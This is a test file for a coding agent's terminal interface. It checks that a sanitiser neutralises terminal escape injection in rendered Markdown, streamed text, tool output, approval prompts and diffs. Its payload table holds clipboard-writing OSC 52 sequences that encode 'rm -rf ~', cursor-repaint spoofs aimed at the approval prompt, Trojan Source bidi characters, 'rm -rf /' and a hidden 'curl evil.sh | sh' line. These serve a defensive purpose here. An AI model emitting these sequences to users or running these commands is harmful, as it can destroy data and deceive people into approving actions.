import { describe, it, expect } from "vitest";

import { renderMarkdown, renderMarkdownBlocks, splitReadyBlocks, trimTrailingNewlines } from "../src/adapters/tui/markdown-render.mjs";
import { createStreamingRenderer } from "../src/adapters/tui/streaming-renderer.mjs";
import { renderToolCall, summariseToolHeader } from "../src/adapters/tui/tool-render.mjs";
import { renderTranscriptNode } from "../src/adapters/tui/transcript-node-render.mjs";
import { renderApprovalRequest, approvalQuestion } from "../src/adapters/tui/approval-prompt.mjs";
import { renderDiff } from "../src/adapters/tui/diff.mjs";
import { renderPanel, renderTable, renderChecklist, wrapText, singleLine } from "../src/adapters/tui/panel.mjs";
import { renderPickerFrame, printSessionChoices } from "../src/adapters/tui/session-picker.mjs";
import { renderCompletionMenu } from "../src/adapters/tui/completion-menu.mjs";
import { renderTurnError } from "../src/adapters/tui/error-render.mjs";
import { renderWelcome, renderStatus, renderPrompt } from "../src/adapters/tui/shell.mjs";
import { renderTodoSummary } from "../src/adapters/tui/todo-render.mjs";
import { createReasoningRenderer } from "../src/adapters/tui/reasoning-render.mjs";
import { createTimelineRenderer } from "../src/adapters/tui/timeline-renderer.mjs";
import { renderResumeHint } from "../src/adapters/tui/shutdown.mjs";
import { sanitizeTerminalText, sanitizeInline, sanitizeStreamPrefix } from "../src/adapters/tui/sanitize.mjs";
import { visibleWidth, isSafeHyperlinkUri } from "../src/adapters/tui/ansi.mjs";
import { EventBus } from "../src/core/events/bus.mjs";
import { createEvent } from "../src/core/events/types.mjs";

/**
 * Phase 3e — terminal escape injection.
 *
 * The property under test is narrow and absolute: after removing the escape
 * sequences THIS PROGRAM is allowed to emit, no rendered string may contain a
 * single control character. Everything else in here (the individual attack
 * vectors, the streaming split, the parity re-check) is a way of driving text
 * to a renderer; the assertion is always `expectNoInjection`.
 */

/**
 * The complete vocabulary of escapes the TUI renderers emit: CSI SGR runs, and
 * OSC 8 hyperlinks terminated with `ESC \`. Deliberately NOT a general ANSI
 * matcher — `ansi.mjs#stripAnsi` would happily swallow an injected OSC 52 as
 * "an OSC", which is exactly what we are hunting for.
 */
const OWN_ESCAPES = /\x1b(?:\[[0-9;]*m|\]8;;[^\x07\x1b]*\x1b\\)/g;

/** Anything left over that a terminal would interpret rather than draw. */
const CONTROL = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/;

function residue(text) {
  return String(text).replace(OWN_ESCAPES, "");
}

function expectNoInjection(rendered, label = "") {
  const left = residue(rendered);
  const match = CONTROL.exec(left);
  if (match) {
    throw new Error(
      `${label || "output"} leaked control char U+${match[0].codePointAt(0).toString(16).padStart(4, "0")} ` +
      `at ${match.index}: ${JSON.stringify(left.slice(Math.max(0, match.index - 40), match.index + 40))}`
    );
  }
  // Bidi overrides reorder the glyphs a reviewer reads; they carry no ESC, so
  // the control-character sweep above cannot see them.
  expect(String(rendered), label).not.toMatch(/[‪-‮⁦-⁩؜‎‏]/);
}

/* ------------------------------------------------------------------ *
 * The payloads
 * ------------------------------------------------------------------ */

const ATTACKS = {
  // Writes the user's clipboard. Widely implemented (xterm, kitty, iTerm2,
  // WezTerm, Windows Terminal, tmux with set-clipboard on).
  "OSC 52 clipboard write": "\x1b]52;c;cm0gLXJmIH4K\x07",
  "OSC 52 (ST terminated)": "\x1b]52;c;cm0gLXJmIH4K\x1b\\",
  "clear screen + home": "\x1b[2J\x1b[H",
  "cursor address": "\x1b[1;1H",
  "cursor up + erase line": "\x1b[10A\x1b[2K",
  "scroll region": "\x1b[1;5r",
  "window title": "\x1b]0;pwned\x07",
  "BEL storm": "\x07\x07\x07\x07\x07\x07\x07\x07",
  "device status report": "\x1b[5n",
  "primary device attributes": "\x1b[c",
  "alternate screen": "\x1b[?1049h",
  "8-bit CSI (C1)": "2J",
  "8-bit OSC (C1)": "52;c;eA==",
  "DEL": "before\x7fafter",
  "CR overwrite": "you approved: safe.txt\rrm -rf /",
  "form feed": "page\x0cbreak",
  "trojan source": "if (user.isAdmin‮ ⁦// nope⁩⁩ ⁦) {",
  "bidi isolate": "⁦admin⁩‭granted‬"
};

/* ------------------------------------------------------------------ *
 * The sanitiser itself
 * ------------------------------------------------------------------ */

describe("sanitizeTerminalText", () => {
  it("rewrites C0 controls to cat -v caret notation, keeping LF and TAB", () => {
    expect(sanitizeTerminalText("\x1b]0;x\x07")).toBe("^[]0;x^G");
    expect(sanitizeTerminalText("\x00\x01\x1f")).toBe("^@^A^_");
    expect(sanitizeTerminalText("a\x7fb")).toBe("a^?b");
    expect(sanitizeTerminalText("keep\nthe\tlayout")).toBe("keep\nthe\tlayout");
  });

  it("rewrites C1 controls, so an 8-bit CSI cannot survive", () => {
    expect(sanitizeTerminalText("2J")).toBe("M-^[2J");
    expect(sanitizeTerminalText("")).toBe("M-^@M-^_");
  });

  it("turns CR into a line break instead of an overwrite", () => {
    expect(sanitizeTerminalText("safe.txt\rrm -rf /")).toBe("safe.txt\nrm -rf /");
    // CRLF collapses — a CRLF file must not come out double-spaced.
    expect(sanitizeTerminalText("a\r\nb\r\n")).toBe("a\nb\n");
    // …and `\r` used as a progress-bar rewind shows every frame, on its own
    // row, rather than hiding all but the last.
    expect(sanitizeTerminalText("10%\r50%\r100%")).toBe("10%\n50%\n100%");
  });

  it("normalises U+2028 / U+2029 to a real line break", () => {
    expect(sanitizeTerminalText("a b c")).toBe("a\nb\nc");
  });

  it("makes bidi overrides visible instead of deleting them (Trojan Source)", () => {
    expect(sanitizeTerminalText("a‮b")).toBe("a<U+202E>b");
    expect(sanitizeTerminalText("⁦⁩؜‎‏"))
      .toBe("<U+2066><U+2069><U+061C><U+200E><U+200F>");
  });

  it("is idempotent — nested renderers sanitise the same string repeatedly", () => {
    for (const payload of Object.values(ATTACKS)) {
      const once = sanitizeTerminalText(payload);
      expect(sanitizeTerminalText(once), payload).toBe(once);
    }
  });

  it("leaves safe text byte-identical (the fast path)", () => {
    const safe = "日本語と emoji 👨‍👩‍👧‍👦 と\tタブ\nと改行 — ok";
    expect(sanitizeTerminalText(safe)).toBe(safe);
  });

  it("does not disturb CJK, emoji, ZWJ sequences or their measured width", () => {
    const text = "見出し 👨‍👩‍👧‍👦 🇯🇵 1️⃣ ｱｲｳ";
    expect(sanitizeTerminalText(text)).toBe(text);
    expect(visibleWidth(sanitizeTerminalText(text))).toBe(visibleWidth(text));
    // …and it does not touch ZWSP / BOM, which are legitimate CJK punctuation.
    expect(sanitizeTerminalText("あ​い﻿")).toBe("あ​い﻿");
  });

  it("sanitizeInline additionally collapses a value to one row", () => {
    expect(sanitizeInline("a\rb\nc  d")).toBe("a b c d");
    expect(sanitizeInline(null)).toBe("");
  });

  it("sanitizeStreamPrefix holds back a trailing CR so CRLF is not split", () => {
    expect(sanitizeStreamPrefix("a\r")).toEqual({ text: "a", pending: "\r" });
    expect(sanitizeStreamPrefix("a\r\n")).toEqual({ text: "a\n", pending: "" });
    expect(sanitizeStreamPrefix("a\rb")).toEqual({ text: "a\nb", pending: "" });
  });
});

/* ------------------------------------------------------------------ *
 * Entry point 1 — model output (Markdown)
 * ------------------------------------------------------------------ */

describe("model output — Markdown", () => {
  for (const [name, payload] of Object.entries(ATTACKS)) {
    it(`neutralises ${name} in a paragraph, a heading, a list, a code fence and a table`, () => {
      const documents = [
        `Prose with ${payload} inline.`,
        `# Heading ${payload}\n`,
        `- item ${payload}\n- second\n`,
        "```js\n" + `const x = "${payload}";\n` + "```\n",
        `| col | ${payload} |\n|-----|-----|\n| a | ${payload} |\n`,
        `> quoted ${payload}\n`,
        `[link](https://example.com/${payload}) and \`code ${payload}\` and **bold ${payload}**`
      ];
      for (const source of documents) {
        for (const colorize of [true, false]) {
          for (const hyperlinks of [true, false]) {
            expectNoInjection(
              renderMarkdown(source, { width: 80, color: colorize, hyperlinks }),
              `${name} / colorize=${colorize} / hyperlinks=${hyperlinks}`
            );
          }
        }
      }
    });
  }

  it("keeps the escape VISIBLE rather than silently dropping it", () => {
    const out = renderMarkdown("run \x1b]52;c;eA==\x07 now", { width: 80, color: false });
    expect(out).toContain("^[]52;c;eA==^G");
  });

  it("still emits our own colours and OSC 8 links from the same document", () => {
    const source = `**bold** and [docs](https://example.com/docs) with ${ATTACKS["OSC 52 clipboard write"]}`;
    const out = renderMarkdown(source, { width: 80, color: true, hyperlinks: true });
    expect(out).toContain("\x1b[1m");                                  // our bold
    expect(out).toContain("\x1b]8;;https://example.com/docs\x1b\\");   // our link
    expectNoInjection(out);
  });

  it("refuses to linkify a URI that carried a control character", () => {
    // The BEL is gone by the time the link matcher runs, but the `^` it left
    // behind still disqualifies the URI (ansi.mjs#isSafeHyperlinkUri).
    expect(isSafeHyperlinkUri("https://evil.com/^Gboom")).toBe(false);
    const out = renderMarkdown("[x](https://evil.com/\x07boom) end", { width: 80, hyperlinks: true });
    expect(out).not.toContain("\x1b]8;");
    expectNoInjection(out);
  });

  it("survives a code fence full of Trojan Source, unchanged in meaning", () => {
    const source = "```js\nif (isAdmin‮ ⁦// safe⁩⁩ ⁦) {\n```\n";
    const out = renderMarkdown(source, { width: 80, color: false });
    expect(out).toContain("<U+202E>");
    expect(out).toContain("<U+2066>");
    expectNoInjection(out);
  });
});

/* ------------------------------------------------------------------ *
 * Entry point 2 — streaming, including a split mid-sequence
 * ------------------------------------------------------------------ */

function makeWriter() {
  return { text: "", columns: 80, write(chunk) { this.text += chunk; return true; } };
}

function streamAll(text, chunks, { colorize = true, width = 80, hyperlinks = false } = {}) {
  const writer = makeWriter();
  writer.columns = width;
  const bus = new EventBus();
  const renderer = createStreamingRenderer({ writer, colorize, width, hyperlinks }).attach(bus);
  for (const chunk of chunks) {
    if (chunk.length === 0) continue;
    bus.emit(createEvent("assistant.message.delta", { sessionId: "s-1", messageId: "m-1", deltaText: chunk }));
  }
  bus.emit(createEvent("assistant.message.completed", {
    sessionId: "s-1",
    messageId: "m-1",
    content: [{ kind: "text", text }]
  }));
  renderer.detach();
  return writer.text;
}

function replayed(text, { colorize, width, hyperlinks = false }) {
  return `${trimTrailingNewlines(renderMarkdown(text, { width, color: colorize, hyperlinks }))}\n\n`;
}

describe("streaming — a sequence split across chunks cannot slip through", () => {
  // This is the hole a naive string-replace sanitiser leaves: `\x1b` arrives in
  // one delta and `]52;…` in the next, so neither chunk matches "an OSC 52".
  // Our map is per-character, so the ESC is dead the moment it lands.
  for (const [name, payload] of Object.entries(ATTACKS)) {
    it(`holds for ${name} at one character per delta`, () => {
      const text = `Here is ${payload} the end.\n\nSecond paragraph.\n`;
      const out = streamAll(text, [...text]);
      expectNoInjection(out, name);
      expect(out).toBe(replayed(text, { colorize: true, width: 80 }));
    });
  }

  it("holds at EVERY two-chunk split point of an escape-bearing document", () => {
    const text = `Prefix \x1b]52;c;cm0K\x07 suffix.\n\n- item \x1b[2J\x1b[H\n- ‮evil\n\n\`\`\`sh\nrm\rls\n\`\`\`\n`;
    const expected = replayed(text, { colorize: true, width: 80 });
    for (let cut = 1; cut < text.length; cut += 1) {
      const out = streamAll(text, [text.slice(0, cut), text.slice(cut)]);
      expectNoInjection(out, `cut=${cut}`);
      expect(out, `cut=${cut}`).toBe(expected);
    }
  });

  it("holds when the split lands exactly between ESC and its payload", () => {
    const text = "before \x1b]52;c;cm0K\x07 after\n\ntail\n";
    const cut = text.indexOf("\x1b") + 1;
    expect(text.slice(0, cut).endsWith("\x1b")).toBe(true);
    const out = streamAll(text, [text.slice(0, cut), text.slice(cut)]);
    expectNoInjection(out);
    expect(out).toBe(replayed(text, { colorize: true, width: 80 }));
  });

  it("keeps `splitReadyBlocks` from ever handing back a raw escape", () => {
    let buffer = "";
    const source = "# t\x1b]0;x\x07\n\npara \x1b[2J\n\ndone\n";
    const seen = [];
    for (const char of source) {
      buffer += char;
      const { blocks, rest } = splitReadyBlocks(buffer);
      buffer = rest;
      // The retained tail may hold ONE raw `\r` (the CRLF look-ahead) and
      // nothing else.
      expect(rest.replace(/\r$/, "")).not.toMatch(CONTROL);
      if (blocks.length > 0) seen.push(renderMarkdownBlocks(blocks, { width: 80, color: true }));
    }
    for (const rendered of seen) expectNoInjection(rendered);
  });

  it("does not regress the CRLF parity the look-ahead protects", () => {
    const text = "# Title\r\n\r\npara\r\n";
    const expected = replayed(text, { colorize: true, width: 80 });
    for (const size of [1, 2, 3, 7, 10_000]) {
      const chunks = [];
      for (let i = 0; i < text.length; i += size) chunks.push(text.slice(i, i + size));
      expect(streamAll(text, chunks), `size=${size}`).toBe(expected);
    }
  });

  it("sanitises on the `color:false` / piped route too (a log file must be safe to cat)", () => {
    const text = `plain \x1b]52;c;cm0K\x07 output\n`;
    const out = streamAll(text, [...text], { colorize: false });
    expect(out).not.toContain("\x1b");
    expectNoInjection(out);
  });
});

/* ------------------------------------------------------------------ *
 * Entry point 3 — tool results (read_file, run_shell, MCP, web)
 * ------------------------------------------------------------------ */

describe("tool results", () => {
  for (const [name, payload] of Object.entries(ATTACKS)) {
    it(`neutralises ${name} arriving from read_file, run_shell and a generic tool`, () => {
      const cases = [
        renderToolCall({
          name: "read_file",
          args: { filePath: `/tmp/${payload}.txt` },
          result: { kind: "read_file", summary: `Read ${payload}`, data: { content: `line1\n${payload}\nline3` } },
          expanded: true
        }),
        renderToolCall({
          name: "run_shell",
          args: { command: `echo ${payload}` },
          result: { kind: "run_shell", summary: "exit 0", data: { stdout: `out ${payload}`, stderr: `err ${payload}` } },
          expanded: true
        }),
        renderToolCall({
          name: "web_browser",
          args: { url: "https://example.com" },
          result: { kind: "web_browser", summary: `Fetched ${payload}` },
          expanded: true
        }),
        renderToolCall({ name: `evil${payload}tool`, args: { a: payload }, status: "start" }),
        summariseToolHeader({ name: "read_file", args: { filePath: payload } })
      ];
      for (const [index, rendered] of cases.entries()) expectNoInjection(rendered, `${name} #${index}`);
    });
  }

  it("clips AFTER sanitising, so the char cap cannot cut a sequence in half", () => {
    const content = `${"\x1b]52;c;cm0K\x07".repeat(400)}`;
    const out = renderToolCall({
      name: "read_file",
      args: { filePath: "a.txt" },
      result: { kind: "read_file", summary: "Read", data: { content } },
      maxChars: 1201
    });
    expectNoInjection(out);
  });

  it("shows a `\\r` progress bar as separate rows instead of one overwritten row", () => {
    const out = renderToolCall({
      name: "run_shell",
      args: { command: "pip install x" },
      result: { kind: "run_shell", summary: "exit 0", data: { stdout: "10%\r50%\r100%" } },
      expanded: true
    });
    expect(out).toContain("10%");
    expect(out).toContain("100%");
    expectNoInjection(out);
  });
});

/* ------------------------------------------------------------------ *
 * Entry point 4 — the approval prompt (privilege escalation surface)
 * ------------------------------------------------------------------ */

describe("approval prompt", () => {
  for (const [name, payload] of Object.entries(ATTACKS)) {
    it(`cannot be repainted by ${name} in the path, the command or the diff`, () => {
      for (const color of [true, false]) {
        expectNoInjection(renderApprovalRequest({
          kind: `write_file${payload}`,
          summary: `summary ${payload}`,
          payload: { filePath: `/repo/${payload}/notes.txt`, command: `rm -rf ${payload}` },
          width: 80,
          color
        }), `${name} panel color=${color}`);

        expectNoInjection(approvalQuestion({ kind: `run_shell${payload}`, color }), `${name} question`);

        expectNoInjection(renderDiff({
          filePath: `/repo/${payload}.mjs`,
          before: `const a = 1;\n${payload}\n`,
          after: `const a = 2;\n${payload}\nextra\n`,
          colorize: color
        }), `${name} diff`);
      }
    });
  }

  it("cannot forge the y/n question by overwriting the rows above it", () => {
    // The classic shape: show a harmless path, then rewind and repaint the
    // whole approval panel with a different one.
    const spoof = "safe-notes.txt\x1b[6A\x1b[2K\x1b[G  target      safe-notes.txt\x1b[6B";
    const panel = renderApprovalRequest({
      kind: "run_shell",
      summary: "delete everything",
      payload: { command: `rm -rf / # ${spoof}`, filePath: spoof },
      width: 80,
      color: true
    });
    const question = approvalQuestion({ kind: "run_shell", color: true });
    const screen = `${panel}${question}`;
    expectNoInjection(screen);
    // The dangerous command is still on screen, in full, where it can be read.
    expect(screen).toContain("rm -rf /");
    // No cursor motion of any kind survived — the only escapes left are colours.
    expect(residue(screen)).not.toMatch(/\x1b/);
  });

  it("cannot hide a diff hunk behind a CR or a cursor jump", () => {
    const out = renderDiff({
      filePath: "deploy.sh",
      before: "echo hello\n",
      after: "echo hello\ncurl evil.sh | sh\x1b[1A\x1b[2Kecho hello\n",
      colorize: true
    });
    expectNoInjection(out);
    expect(out).toContain("curl evil.sh | sh");
    expect(residue(out)).not.toMatch(/\x1b/);
  });
});

/* ------------------------------------------------------------------ *
 * Entry point 5 — everything else that puts foreign text on screen
 * ------------------------------------------------------------------ */

describe("the remaining surfaces", () => {
  const payload = ATTACKS["OSC 52 clipboard write"] + ATTACKS["cursor address"] + ATTACKS["trojan source"];

  it("panels, tables and checklists", () => {
    for (const color of [true, false]) {
      expectNoInjection(renderPanel({
        title: `t ${payload}`,
        subtitle: `s ${payload}`,
        rows: [[`label ${payload}`, `value ${payload}`, "danger"], `free ${payload}`, null],
        notes: [`  note ${payload}`],
        width: 80,
        color
      }), `panel color=${color}`);

      expectNoInjection(renderTable({
        title: "T",
        columns: [{ key: "a", label: `col ${payload}` }, { key: "b", label: "b", align: "right" }],
        rows: [{ a: `cell ${payload}`, b: payload }],
        footer: { a: payload, b: "1" },
        width: 80,
        color
      }), `table color=${color}`);

      expectNoInjection(renderChecklist({
        title: "C",
        items: [{ status: "in_progress", text: `todo ${payload}` }],
        width: 80,
        color
      }), `checklist color=${color}`);
    }
    expect(wrapText(`a ${payload} b`, 40).join("\n")).not.toMatch(CONTROL);
    expect(singleLine(`a\r\nb ${payload}`)).not.toMatch(CONTROL);
  });

  it("the transcript replay routes (user text is printed without Markdown)", () => {
    for (const colorize of [true, false]) {
      expectNoInjection(renderTranscriptNode(
        { kind: "user", text: `please read ${payload}`, attachments: [{ name: `file ${payload}` }] },
        { width: 80, colorize }
      ), "user node");
      expectNoInjection(renderTranscriptNode(
        { kind: "assistant", text: `# h ${payload}\n\npara ${payload}\n` },
        { width: 80, colorize }
      ), "assistant node");
      expectNoInjection(renderTranscriptNode(
        { kind: "tool", toolCallId: "t1", text: JSON.stringify({ kind: "read_file", summary: payload }) },
        { width: 80, colorize, toolCalls: new Map([["t1", { name: "read_file", args: { filePath: payload } }]]) }
      ), "tool node");
      expectNoInjection(renderTranscriptNode(
        { kind: "compact-summary", strategy: payload, text: payload },
        { width: 80, colorize }
      ), "compact node");
      expectNoInjection(renderTranscriptNode({ kind: "system", text: payload }, { width: 80, colorize }), "system node");
    }
  });

  it("the session picker, in both its interactive and its piped form", () => {
    const sessions = [{
      sessionId: `s-${payload}`,
      title: `title ${payload}`,
      model: `model ${payload}`,
      messageCount: 3,
      updatedAt: new Date().toISOString()
    }];
    for (const color of [true, false]) {
      const { lines } = renderPickerFrame({ sessions, selected: 0, pageSize: 5, width: 80, color });
      expectNoInjection(lines.join("\n"), `picker color=${color}`);
    }
    const out = { text: "", write(chunk) { this.text += chunk; } };
    printSessionChoices({ sessions, output: out });
    expectNoInjection(out.text, "printSessionChoices");
  });

  it("the completion menu (candidates are directory entries)", () => {
    for (const color of [true, false]) {
      expectNoInjection(renderCompletionMenu({
        items: [
          { value: `@src/${payload}`, label: `@src/${payload}`, description: "" },
          { value: "@a", label: "@a", description: `desc ${payload}` }
        ],
        selected: 0,
        total: 9,
        width: 80,
        color
      }), `menu color=${color}`);
    }
  });

  it("provider error panels", () => {
    for (const color of [true, false]) {
      const error = Object.assign(new Error(`boom ${payload}`), { status: 500 });
      expectNoInjection(renderTurnError(error, { width: 80, color }), `error color=${color}`);
    }
  });

  it("the shell chrome — welcome card, prompt header, /status", () => {
    for (const color of [true, false]) {
      expectNoInjection(renderWelcome({
        sessionId: `s${payload}`, cwd: `/w/${payload}`, provider: payload, model: payload,
        approvalMode: payload, width: 80, color
      }), `welcome color=${color}`);
      expectNoInjection(renderPrompt({
        cwd: `/w/${payload}`, provider: payload, model: payload, approvalMode: payload, width: 80, color, tty: true
      }), `prompt color=${color}`);
      expectNoInjection(renderStatus({
        cwd: `/w/${payload}`, sessionId: payload, provider: payload, model: payload,
        approvalMode: payload, disabledTools: [{ name: payload, reason: payload }], width: 80, color
      }), `status color=${color}`);
    }
  });

  it("the prompt header stays exactly two rows even with a newline injected", () => {
    const out = renderPrompt({ cwd: "/w/a\nb\rc", provider: "p\nq", model: "m", width: 80, color: false, tty: true });
    expect(out.split("\n")).toHaveLength(2);
  });

  it("the resume hint printed on the way out", () => {
    for (const colorize of [true, false]) {
      expectNoInjection(renderResumeHint({
        session: { sessionId: `01J${payload}`, messages: [{ role: "user", content: "hi" }, { role: "assistant", content: "yo" }] },
        command: `procway-code${payload}`,
        colorize
      }), `resume hint colorize=${colorize}`);
    }
  });

  it("the todo ping and the reasoning stream", () => {
    expectNoInjection(renderTodoSummary([{ status: "in_progress", activeForm: `doing ${payload}` }]), "todo");

    const writer = makeWriter();
    const renderer = createReasoningRenderer({ writer, width: () => 60, colorize: true });
    renderer.push(`thinking about ${payload}\n`);
    renderer.flush();
    expectNoInjection(writer.text, "reasoning");
  });

  it("the live timeline (spinner labels repaint on the same row)", () => {
    const writer = { text: "", isTTY: false, write(chunk) { this.text += chunk; } };
    const bus = new EventBus();
    const renderer = createTimelineRenderer({ writer, colorize: true }).attach(bus);
    bus.emit(createEvent("activity.started", { activityId: "a1", label: `model ${payload}`, detail: payload }));
    bus.emit(createEvent("activity.stopped", { activityId: "a1", outcome: `done ${payload}` }));
    bus.emit(createEvent("tool.call.scheduled", { toolCallId: "t1", name: `read_file${payload}`, args: { filePath: payload } }));
    bus.emit(createEvent("tool.call.started", { toolCallId: "t1", name: `read_file${payload}` }));
    bus.emit(createEvent("tool.call.completed", { toolCallId: "t1", ok: true }));
    bus.emit(createEvent("compact.applied", { strategy: payload }));
    renderer.detach();
    expectNoInjection(writer.text, "timeline");
  });
});

/* ------------------------------------------------------------------ *
 * The invariants Phase 3c/3d bought, re-checked with escapes present
 * ------------------------------------------------------------------ */

describe("live/replay parity survives sanitisation", () => {
  const DOCS = {
    "escapes everywhere": [
      "# Title \x1b]0;pwned\x07",
      "",
      "Para with \x1b]52;c;cm0K\x07 and \x1b[2J and a [link](https://example.com/a).",
      "",
      "- item \x1b[1;1H",
      "- ‮reversed‬",
      "",
      "```sh",
      "echo hi\rrm -rf /",
      "```",
      "",
      "| a | b |",
      "|---|---|",
      "| \x07 | 2J |",
      "",
      "> quoted \x7f",
      "",
      "Final."
    ].join("\n"),
    "crlf plus escapes": "# T\r\n\r\npara \x1b]52;c;x\x07\r\n",
    "japanese with an escape": "日本語の文章に \x1b]0;x\x07 が混ざります。折り返しも確認します。\n\n- 箇条書き 👨‍👩‍👧‍👦 \x07\n"
  };

  for (const [name, text] of Object.entries(DOCS)) {
    for (const colorize of [true, false]) {
      it(`"${name}" (colorize=${colorize}) streams to the replayed bytes at every chunk size`, () => {
        const expected = replayed(text, { colorize, width: 80 });
        expectNoInjection(expected, name);
        const chunkings = [
          ...[1, 2, 3, 7, 40, 10_000].map((size) => {
            const chunks = [];
            for (let i = 0; i < text.length; i += size) chunks.push(text.slice(i, i + size));
            return chunks;
          }),
          text.split(/(?<=\n)/),
          text.split(/(?=\n)/),
          [text]
        ];
        for (const chunks of chunkings) {
          expect(streamAll(text, chunks, { colorize, width: 80 })).toBe(expected);
        }
      });
    }
  }

  it("holds with OSC 8 links on, at a width that forces the per-row re-open", () => {
    const text = "See [the docs](https://example.com/deep/path) about \x1b]52;c;cm0K\x07 and more text to wrap.\n";
    for (const width of [40, 80]) {
      const expected = replayed(text, { colorize: true, width, hyperlinks: true });
      expect(expected).toContain("\x1b]8;;https://example.com/deep/path\x1b\\");
      expectNoInjection(expected);
      for (const size of [1, 3, 7, 5000]) {
        const chunks = [];
        for (let i = 0; i < text.length; i += size) chunks.push(text.slice(i, i + size));
        expect(streamAll(text, chunks, { colorize: true, width, hyperlinks: true })).toBe(expected);
      }
    }
  });

  it("matches the assistant node the transcript replays, byte for byte", () => {
    const text = DOCS["escapes everywhere"];
    const node = renderTranscriptNode({ kind: "assistant", text }, { width: 80, colorize: true });
    const chunks = [];
    for (let i = 0; i < text.length; i += 7) chunks.push(text.slice(i, i + 7));
    expect(streamAll(text, chunks, { colorize: true, width: 80 })).toBe(`${node}\n\n`);
  });
});
